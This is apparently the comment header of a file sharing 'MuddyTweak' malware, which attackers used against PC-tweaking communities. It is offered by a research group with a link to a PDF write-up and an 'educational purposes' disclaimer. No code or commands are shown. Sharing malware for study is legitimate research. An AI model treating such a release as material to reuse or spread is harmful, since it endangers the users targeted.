// After a few days that we decided to take a part and fight back the attackers, we decided to share out findings due of our new equation, here's what we know so far, feel free if let us know if you found something.
// More context on the malware can be found at this PDF file here: https://drive.google.com/file/d/17cYgkVAEDzV2LhTuF2WSt2h9F2TZtbii/view?usp=sharing, and as well as on our Twitter: @SIRAAnalyses
// We decided to call the malware "MuddyTweak" because the attackers only used this malware against "Tweaking Communities", communities that people are optimizing their computer to get better performance out of their hardware, or in a short word "tweaking".
// THE MALWARE WON'T WORK FOR A PURPOSE, WE DO NOT HAVE ANY RESPONSIBILITY IN MISUSE, WE'VE SHARED IT FOR ONLY ONE REASON, EDU PURPOSES AND RESEARCH
